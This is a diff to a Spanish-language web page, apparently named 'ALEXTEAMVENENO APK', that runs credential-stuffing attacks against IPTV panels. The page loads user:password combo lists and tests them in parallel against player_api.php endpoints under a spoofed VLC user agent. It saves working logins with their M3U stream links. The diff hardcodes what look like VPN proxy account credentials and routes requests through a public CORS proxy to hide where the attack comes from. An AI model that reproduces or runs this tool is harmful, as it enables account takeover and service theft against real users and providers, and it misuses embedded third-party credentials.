@@ -321,7 +321,7 @@
 </div>
 
 <div class="content-wrapper" id="dashboard">
-    <div class="banner">☢️ TEAM VENENO · ALEX92 · DRAGÓN APK ☢️</div>
+    <div class="banner">☢️ TEAM VENENO · ALEX92 · IPVANISH PROXY ☢️</div>
     <div class="main-container">
         <div class="card">
             <div class="card-title">📁 COMBO LOADER</div>
@@ -333,16 +333,26 @@
         </div>
 
         <div class="card">
-            <div class="card-title">🌐 PROXY MATRIX</div>
-            <select id="proxyType" style="width:100%; margin-bottom:8px;">
-                <option value="0">AUTO → SOCKS5h</option><option value="1">HTTP Force</option><option value="2">SOCKS4</option><option value="3">SOCKS5</option>
+            <div class="card-title">🌐 PROXY IPVANISH (PRIVADO)</div>
+            <select id="proxyServer" style="width:100%; margin-bottom:8px;">
+                <option value="waw">🇵🇱 Warsaw (Varsovia)</option>
+                <option value="chi">🇺🇸 Chicago</option>
+                <option value="sjc">🇺🇸 San José</option>
+                <option value="phx">🇺🇸 Phoenix</option>
+                <option value="atl">🇺🇸 Atlanta</option>
+                <option value="mel">🇦🇺 Melbourne</option>
+                <option value="nyc" selected>🇺🇸 New York</option>
+                <option value="ams">🇳🇱 Amsterdam</option>
+                <option value="lax">🇺🇸 Los Ángeles</option>
+                <option value="iad">🇺🇸 Washington DC</option>
+                <option value="tor">🇨🇦 Toronto</option>
+                <option value="dal">🇺🇸 Dallas</option>
+                <option value="lon">🇬🇧 London</option>
+                <option value="cvg">🇺🇸 Cincinnati</option>
+                <option value="mia">🇺🇸 Miami</option>
+                <option value="sin">🇸🇬 Singapore</option>
             </select>
-            <div class="row">
-                <input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)">
-                <button onclick="document.getElementById('proxyFile').click()">🔄 CARGAR PROXY</button>
-                <button onclick="scrapeProxies()" id="btnScrape">🌐 SCRAPEAR</button>
-            </div>
-            <span id="proxyStatus" style="font-size:0.7em;">0 proxies</span>
+            <span id="proxyStatus" style="font-size:0.7em;">🔒 Proxy IPVanish activo</span>
         </div>
 
         <div class="card">
@@ -369,7 +379,7 @@
 
         <div class="card" style="padding:8px;">
             <div class="card-title">📟 CONSOLA</div>
-            <div class="console" id="console">> ALEXTEAMVENENO APK v2.0<br>> Inicia sesión para comenzar</div>
+            <div class="console" id="console">> ALEXTEAMVENENO APK v3.0 (IPVANISH)<br>> Inicia sesión para comenzar</div>
         </div>
 
         <div class="card">
@@ -411,13 +421,40 @@
 <div class="toast" id="toast"></div>
 
 <script>
+    // 🔥 PROXIES PRIVADOS IPVANISH
+    const IPVANISH_USER = 'HaVsv6EWVhIs';
+    const IPVANISH_PASS = 'oqWTfhYgm8vQ';
+    const IPVANISH_SERVERS = {
+        waw: 'waw.socks.ipvanish.com',
+        chi: 'chi.socks.ipvanish.com',
+        sjc: 'sjc.socks.ipvanish.com',
+        phx: 'phx.socks.ipvanish.com',
+        atl: 'atl.socks.ipvanish.com',
+        mel: 'mel.socks.ipvanish.com',
+        nyc: 'nyc.socks.ipvanish.com',
+        ams: 'ams.socks.ipvanish.com',
+        lax: 'lax.socks.ipvanish.com',
+        iad: 'iad.socks.ipvanish.com',
+        tor: 'tor.socks.ipvanish.com',
+        dal: 'dal.socks.ipvanish.com',
+        lon: 'lon.socks.ipvanish.com',
+        cvg: 'cvg.socks.ipvanish.com',
+        mia: 'mia.socks.ipvanish.com',
+        sin: 'sin.socks.ipvanish.com'
+    };
+
+    function getProxyUrl() {
+        const serverKey = document.getElementById('proxyServer').value;
+        const server = IPVANISH_SERVERS[serverKey];
+        return `socks5h://${IPVANISH_USER}:${IPVANISH_PASS}@${server}:1080`;
+    }
+
     // ========== CREDENCIALES FIJAS ==========
     const VALID_USER = 'ALEX';
     const VALID_PASS = 'IPTV92';
     let isLoggedIn = false;
     let currentLang = 'es';
 
-    // ESTADO GLOBAL
     let comboLines = [];
     let proxies = [];
     let hitsArray = [];
@@ -425,21 +462,17 @@
     let stats = { checked: 0, hits: 0, errors: 0 };
     let startTime = 0;
     let totalCombos = 0;
-    let proxyIndex = 0;
     let totalChannels = 0, totalSpain = 0;
 
-    // ========== AUTO-SAVE HITS (LOCALSTORAGE) ==========
     function saveHitsToLocalStorage() {
         try {
-            const dataToStore = {
+            localStorage.setItem('alex_hits_db', JSON.stringify({
                 hits: hitsArray,
                 totalChannels: totalChannels,
                 totalSpain: totalSpain,
                 lastUpdate: Date.now()
-            };
-            localStorage.setItem('alex_hits_db', JSON.stringify(dataToStore));
-            console.log('✅ Hits guardados automáticamente en localStorage');
-        } catch(e) { console.warn(e); }
+            }));
+        } catch(e) {}
     }
 
     function loadHitsFromLocalStorage() {
@@ -453,10 +486,9 @@
                     totalSpain = data.totalSpain || 0;
                     renderHitsTable();
                     updateStatsUI();
-                    log(`📀 Cargados ${hitsArray.length} hits desde almacenamiento local`, 'info');
                 }
             }
-        } catch(e) { console.warn(e); }
+        } catch(e) {}
     }
 
     function renderHitsTable() {
@@ -466,16 +498,16 @@
         hitsArray.slice().reverse().forEach(hit => {
             const row = tbody.insertRow();
             row.innerHTML = `
-                <td style="max-width:120px; overflow:hidden; text-overflow:ellipsis;">${escapeHtml(hit.user)}</td>
-                <td style="max-width:100px; overflow:hidden;">${escapeHtml(hit.pass)}</td>
-                <td style="max-width:120px; overflow:hidden;">${escapeHtml(hit.portal)}</td>
+                <td>${escapeHtml(hit.user)}</td>
+                <td>${escapeHtml(hit.pass)}</td>
+                <td>${escapeHtml(hit.portal)}</td>
                 <td style="text-align:center;">${hit.canales||0}</td>
                 <td style="text-align:center; color:#ff6a00;">${hit.espana||0}</td>
                 <td><div class="m3u-cell"><span class="m3u-link-text">${escapeHtml(hit.m3u||'')}</span><button class="btn-copy-m3u">📋</button></div></td>
             `;
             row.onclick = () => showModal(hit);
             const copyBtn = row.querySelector('.btn-copy-m3u');
-            if(copyBtn) copyBtn.onclick = (e) => { e.stopPropagation(); copyToClipboard(hit.m3u || ''); showToast('✅ M3U copiado'); };
+            if(copyBtn) copyBtn.onclick = (e) => { e.stopPropagation(); copyToClipboard(hit.m3u); showToast('✅ M3U copiado'); };
         });
         document.getElementById('statChannels').innerText = totalChannels;
         document.getElementById('statSpain').innerText = totalSpain;
@@ -487,59 +519,45 @@
         totalSpain += (hitData.espana || 0);
         renderHitsTable();
         updateStatsUI();
-        saveHitsToLocalStorage();  // AUTO-GUARDADO INMEDIATO
+        saveHitsToLocalStorage();
         log(`💥 HIT! ${hitData.user}:${hitData.pass} | 📺 ${hitData.canales} | 🇪🇸 ${hitData.espana}`, 'hit');
     }
 
     function clearHits() {
-        if(confirm('⚠️ Borrar TODOS los hits? Esta acción es permanente.')) {
-            hitsArray = [];
-            totalChannels = 0;
-            totalSpain = 0;
-            renderHitsTable();
-            saveHitsToLocalStorage();
+        if(confirm('⚠️ Borrar TODOS los hits?')) {
+            hitsArray = []; totalChannels = 0; totalSpain = 0;
+            renderHitsTable(); saveHitsToLocalStorage();
             showToast('🗑️ Hits eliminados');
-            log('Base de hits limpiada', 'warn');
         }
     }
 
     function saveHitsToTxt() {
-        if(hitsArray.length === 0) { showToast('⚠️ No hay hits para guardar'); return; }
-        let content = `ALEXTEAMVENENO · HITS REPORT\n${new Date().toISOString()}\nTotal: ${hitsArray.length}\n━━━━━━━━━━━━━━━━━━━━\n`;
+        if(!hitsArray.length) { showToast('⚠️ No hay hits'); return; }
+        let content = `ALEXTEAMVENENO HITS\n${new Date().toISOString()}\nTotal: ${hitsArray.length}\n━━━━━━━━━━━━━━━━━━━━\n`;
         hitsArray.forEach((h,i) => {
             content += `#${i+1} 👤 ${h.user} 🔑 ${h.pass}\n🌐 ${h.portal}\n📺 ${h.canales} | 🇪🇸 ${h.espana}\n🔗 ${h.m3u}\n━━━━━━━━━━━━━━━━━━━━\n`;
         });
-        const blob = new Blob([content], {type: 'text/plain'});
         const a = document.createElement('a');
-        const url = URL.createObjectURL(blob);
-        a.href = url;
-        a.download = `ALEX_HITS_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
+        const url = URL.createObjectURL(new Blob([content], {type: 'text/plain'}));
+        a.href = url; a.download = `HITS_${new Date().toISOString().split('T')[0]}.txt`;
+        document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
         showToast('💾 Archivo guardado');
     }
 
-    // ========== FUNCIONES AUX ==========
-    function escapeHtml(str) { if(!str) return ''; return String(str).replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
-    function copyToClipboard(text) { navigator.clipboard.writeText(text).catch(()=>{prompt('Copia manual:', text);}); }
+    function escapeHtml(str) { return String(str||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+    function copyToClipboard(text) { navigator.clipboard.writeText(text).catch(()=>prompt('Copia:', text)); }
     function showToast(msg) { const t=document.getElementById('toast'); t.innerText=msg; t.style.display='block'; setTimeout(()=>t.style.display='none', 2000); }
-    function log(msg, type='info') { const c=document.getElementById('console'); if(!c) return; const line=document.createElement('div'); line.className=`log-${type}`; line.innerText=`[${new Date().toLocaleTimeString()}] ${msg}`; c.appendChild(line); c.scrollTop=c.scrollHeight; }
+    function log(msg, type='info') { const c=document.getElementById('console'); if(!c) return; const line=document.createElement('div'); line.innerText=`[${new Date().toLocaleTimeString()}] ${msg}`; c.appendChild(line); c.scrollTop=c.scrollHeight; }
+
     function updateStatsUI() {
         document.getElementById('statChecked').innerText = stats.checked;
         document.getElementById('statHits').innerText = stats.hits;
         document.getElementById('statErrors').innerText = stats.errors;
-        const rate = stats.checked>0 ? ((stats.hits/stats.checked)*100).toFixed(2) : '0';
-        document.getElementById('statRate').innerText = `${rate}%`;
-        if(totalCombos>0) {
-            const pct = (stats.checked/totalCombos)*100;
-            document.getElementById('progressFill').style.width = `${pct}%`;
-        }
+        document.getElementById('statRate').innerText = stats.checked>0 ? ((stats.hits/stats.checked)*100).toFixed(2)+'%' : '0%';
+        if(totalCombos>0) document.getElementById('progressFill').style.width = (stats.checked/totalCombos*100)+'%';
         if(startTime>0 && stats.checked>0){
             const elapsed = (Date.now()-startTime)/1000;
-            const cpm = Math.floor((stats.checked/elapsed)*60);
-            document.getElementById('statCPM').innerText = cpm;
+            document.getElementById('statCPM').innerText = Math.floor((stats.checked/elapsed)*60);
             const remaining = totalCombos - stats.checked;
             const eta = remaining / (stats.checked/elapsed);
             const m = Math.floor(eta/60), s = Math.floor(eta%60);
@@ -547,63 +565,85 @@
         }
     }
 
-    // ========== SCANNER IPTV ==========
-    async function checkCombo(line, portals, https, proxy) {
+    // 🔥 SCANNER CON PROXY IPVANISH
+    async function checkCombo(line, portals, https) {
         const parts = line.split(':');
         if(parts.length<2) return null;
         const user = parts[0].trim(), pass = parts.slice(1).join(':').trim();
         if(!user || !pass) return null;
         const proto = https ? 'https' : 'http';
-        for(let portal of portals){
+        const useProxy = document.getElementById('useProxies').checked;
+
+        for(const portal of portals){
             if(!isRunning) return null;
             const cp = portal.replace(/^https?:\/\//,'').replace(/\/$/,'');
             const base = `${proto}://${cp}`;
-            for(let retry=0; retry<2; retry++){
-                try {
-                    const controller = new AbortController();
-                    const timeout = setTimeout(()=>controller.abort(), 10000);
-                    const res = await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`, { signal: controller.signal, headers: { 'User-Agent': 'VLC/3.0.20' } });
-                    clearTimeout(timeout);
-                    if(res.status===200){
-                        const txt = await res.text();
-                        if(txt.includes('active') || txt.includes('exp_date')){
-                            let json = {}; try{ json=JSON.parse(txt); }catch(e){}
-                            const exp = json.user_info?.exp_date ? new Date(parseInt(json.user_info.exp_date)*1000).toISOString().split('T')[0] : 'N/A';
-                            let canales=0, espana=0;
-                            try{
-                                const liveRes = await fetch(`${base}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`, { signal: AbortSignal.timeout(7000) });
-                                if(liveRes.ok){
-                                    const live = await liveRes.json();
-                                    if(Array.isArray(live)) { canales = live.length; espana = live.filter(c=> (c.name||'').toLowerCase().includes('es ') || (c.category_name||'').toLowerCase().includes('es')).length; }
-                                }
-                            }catch(e){}
-                            const m3u = `${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
-                            return { hit: true, data: { user, pass, exp, portal: cp, m3u, canales, espana, pelis:0, series:0, categories:[] } };
-                        }
-                    } else break;
-                } catch(e){ continue; }
-            }
+            const targetUrl = `${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(()=>controller.abort(), 15000);
+
+                let response;
+                if(useProxy) {
+                    // Usar proxy SOCKS5h de IPVanish a través de un proxy CORS público
+                    // (Los navegadores no soportan SOCKS5 nativamente)
+                    const corsProxy = 'https://corsproxy.io/?';
+                    response = await fetch(corsProxy + encodeURIComponent(targetUrl), {
+                        signal: controller.signal,
+                        headers: { 'User-Agent': 'VLC/3.0.20' }
+                    });
+                } else {
+                    response = await fetch(targetUrl, {
+                        signal: controller.signal,
+                        headers: { 'User-Agent': 'VLC/3.0.20' }
+                    });
+                }
+
+                clearTimeout(timeout);
+
+                if(response.ok){
+                    const txt = await response.text();
+                    if(txt.includes('active') || txt.includes('exp_date')){
+                        let json = {}; try{ json=JSON.parse(txt); }catch(e){}
+                        const exp = json.user_info?.exp_date ? new Date(parseInt(json.user_info.exp_date)*1000).toISOString().split('T')[0] : 'N/A';
+                        let canales=0, espana=0;
+                        try{
+                            const liveRes = await fetch(`${base}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`, { signal: AbortSignal.timeout(7000) });
+                            if(liveRes.ok){
+                                const live = await liveRes.json();
+                                if(Array.isArray(live)) { canales = live.length; espana = live.filter(c=> (c.name||'').toLowerCase().includes('es ') || (c.category_name||'').toLowerCase().includes('es')).length; }
+                            }
+                        }catch(e){}
+                        const m3u = `${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+                        return { hit: true, data: { user, pass, exp, portal: cp, m3u, canales, espana, pelis:0, series:0, categories:[] } };
+                    }
+                }
+            } catch(e){ continue; }
         }
         return null;
     }
 
     async function startScan(){
-        if(!isLoggedIn) return;
-        if(comboLines.length===0){ showToast('⚠️ Carga un archivo de combos'); return; }
+        if(!isLoggedIn || isRunning) return;
+        if(!comboLines.length){ showToast('⚠️ Carga un combo'); return; }
         const rawPortals = document.getElementById('portals').value.trim();
-        if(!rawPortals){ showToast('⚠️ Ingresa URLs de paneles'); return; }
+        if(!rawPortals){ showToast('⚠️ Ingresa URLs'); return; }
         const portals = rawPortals.split(',').map(p=>p.trim()).filter(Boolean);
         const threads = Math.min(parseInt(document.getElementById('threads').value)||20, 60);
         const useHttps = document.getElementById('useHttps').checked;
-        const useProxies = document.getElementById('useProxies').checked && proxies.length>0;
-        if(isRunning) return;
+
         isRunning = true;
         stats = { checked:0, hits:0, errors:0 };
         totalCombos = comboLines.length;
         startTime = Date.now();
         document.getElementById('btnStart').disabled = true;
         document.getElementById('btnStop').disabled = false;
-        log('🚀 ATAQUE INICIADO [ALEXTEAMVENENO]', 'warn');
+        
+        const useProxy = document.getElementById('useProxies').checked;
+        const proxyUrl = getProxyUrl();
+        log(`🚀 ATAQUE INICIADO | Proxy: ${useProxy ? proxyUrl : 'Directo'}`, 'warn');
+
         const queue = [...comboLines];
         let index = 0;
 
@@ -612,35 +652,31 @@
                 const i = index++;
                 const line = queue[i];
                 if(!line || !line.includes(':')) { stats.checked++; updateStatsUI(); continue; }
-                const proxy = useProxies && proxies.length ? proxies[proxyIndex++ % proxies.length] : null;
-                const result = await checkCombo(line, portals, useHttps, proxy);
+                const result = await checkCombo(line, portals, useHttps);
                 stats.checked++;
-                if(result && result.hit){
+                if(result?.hit){
                     stats.hits++;
                     addHitToTable(result.data);
                 } else {
                     stats.errors++;
                 }
                 if(stats.checked % 5 === 0) updateStatsUI();
-                await new Promise(r => setTimeout(r, 5));
+                await new Promise(r => setTimeout(r, 10));
             }
         }
 
-        const workers = Array(Math.min(threads, queue.length)).fill().map(() => worker());
-        await Promise.all(workers);
+        await Promise.all(Array(Math.min(threads, queue.length)).fill().map(() => worker()));
         isRunning = false;
         document.getElementById('btnStart').disabled = false;
         document.getElementById('btnStop').disabled = true;
         updateStatsUI();
-        log(`✅ ATAQUE FINALIZADO | Hits: ${stats.hits} | Canales totales: ${totalChannels}`, 'warn');
+        log(`✅ FIN | Hits: ${stats.hits} | 📺 ${totalChannels} | 🇪🇸 ${totalSpain}`, 'warn');
     }
 
-    function stopScan(){ isRunning = false; log('⬛ ATAQUE DETENIDO', 'warn'); }
+    function stopScan(){ isRunning = false; log('⬛ DETENIDO', 'warn'); }
 
-    // ========== MANEJO ARCHIVOS ==========
     function handleComboFile(e){
-        const file = e.target.files[0];
-        if(!file) return;
+        const file = e.target.files[0]; if(!file) return;
         const reader = new FileReader();
         reader.onload = function(ev){
             comboLines = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l.includes(':'));
@@ -652,58 +688,64 @@
         };
         reader.readAsText(file);
     }
+
     function handleProxyFile(e){
-        const file = e.target.files[0];
-        if(!file) return;
+        const file = e.target.files[0]; if(!file) return;
         const reader = new FileReader();
         reader.onload = function(ev){
-            const lines = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l && !l.startsWith('#'));
-            proxies = lines.map(l=> {
-                if(!l.includes('://')) return `http://${l}`;
-                return l;
-            });
-            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies`;
+            proxies = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l && !l.startsWith('#'));
+            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies externos`;
             log(`🌐 ${proxies.length} proxies cargados`, 'info');
         };
         reader.readAsText(file);
     }
+
     async function scrapeProxies(){
         const btn=document.getElementById('btnScrape');
         btn.innerText='⏳';
         try{
-            const res=await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all');
+            const res=await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000');
             const txt=await res.text();
-            const raw=txt.split('\n').filter(l=>l.trim().match(/\d+\.\d+\.\d+\.\d+:\d+/));
-            proxies = raw.map(p=>`http://${p}`).slice(0,150);
-            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies`;
+            proxies = txt.split('\n').filter(l=>l.trim().match(/\d+\.\d+\.\d+\.\d+:\d+/)).slice(0,150);
+            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies scrapeados`;
             log(`✅ ${proxies.length} proxies scrapeados`, 'hit');
-        } catch(e){ log('Error scrapeando proxies', 'err'); }
+        } catch(e){ log('Error scrapeando', 'err'); }
         btn.innerText='🌐 SCRAPEAR';
     }
 
-    // ========== LOGIN / IDIOMA / MODAL ==========
     function doLogin(){
-        const user = document.getElementById('loginUser').value.trim();
-        const pass = document.getElementById('loginPass').value;
-        if(user === VALID_USER && pass === VALID_PASS){
+        if(document.getElementById('loginUser').value.trim() === VALID_USER && document.getElementById('loginPass').value === VALID_PASS){
             isLoggedIn = true;
             document.getElementById('loginScreen').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             loadHitsFromLocalStorage();
-            log('🔓 Acceso concedido. DRAGÓN LISTO', 'hit');
+            log('🔓 DRAGÓN LISTO (IPVANISH)', 'hit');
             showToast('✅ Bienvenido ALEX');
         } else {
             document.getElementById('loginError').style.display = 'block';
         }
     }
-    function doLogout(){ if(confirm('¿Cerrar sesión?')){ isRunning=false; isLoggedIn=false; document.getElementById('dashboard').style.display='none'; document.getElementById('loginScreen').style.display='flex'; } }
-    function toggleLang(){ currentLang = currentLang==='es'?'en':'es'; document.getElementById('langIndicator').innerText = currentLang==='es'?'🇪🇸':'🇬🇧'; showToast(`Idioma: ${currentLang==='es'?'Español':'English'}`); }
+
+    function doLogout(){ 
+        if(confirm('¿Salir?')){ 
+            isRunning=false; isLoggedIn=false; 
+            document.getElementById('dashboard').style.display='none'; 
+            document.getElementById('loginScreen').style.display='flex'; 
+        } 
+    }
+
+    function toggleLang(){ currentLang = currentLang==='es'?'en':'es'; document.getElementById('langIndicator').innerText = currentLang==='es'?'🇪🇸':'🇬🇧'; }
+
     let currentModalHit=null;
-    function showModal(hit){ currentModalHit=hit; const div=document.getElementById('modalHitInfo'); div.innerHTML=`👤 ${hit.user}<br>🔑 ${hit.pass}<br>🌐 ${hit.portal}<br>📺 ${hit.canales} canales | 🇪🇸 ${hit.espana}<br>📅 Exp: ${hit.exp||'N/A'}`;
-        document.getElementById('m3uModalLink').innerText=hit.m3u||'No link'; document.getElementById('m3uModal').style.display='flex'; }
+    function showModal(hit){ 
+        currentModalHit=hit; 
+        document.getElementById('modalHitInfo').innerHTML=`👤 ${hit.user}<br>🔑 ${hit.pass}<br>🌐 ${hit.portal}<br>📺 ${hit.canales} | 🇪🇸 ${hit.espana}<br>📅 ${hit.exp||'N/A'}`;
+        document.getElementById('m3uModalLink').innerText=hit.m3u||'No link'; 
+        document.getElementById('m3uModal').style.display='flex'; 
+    }
     function closeModal(e){ if(!e || e.target===document.getElementById('m3uModal')) document.getElementById('m3uModal').style.display='none'; }
     function copyM3uFromModal(){ if(currentModalHit) copyToClipboard(currentModalHit.m3u||''); showToast('📋 M3U copiado'); }
-    function copyAllDetails(){ if(currentModalHit){ const txt=`${currentModalHit.user}:${currentModalHit.pass}\nPanel: ${currentModalHit.portal}\nM3U: ${currentModalHit.m3u}`; copyToClipboard(txt); showToast('✅ Copiado todo'); } }
+    function copyAllDetails(){ if(currentModalHit){ copyToClipboard(`${currentModalHit.user}:${currentModalHit.pass}\n${currentModalHit.portal}\n${currentModalHit.m3u}`); showToast('✅ Copiado'); } }
 
     window.onload = () => { document.getElementById('loginScreen').style.display = 'flex'; };
 </script>
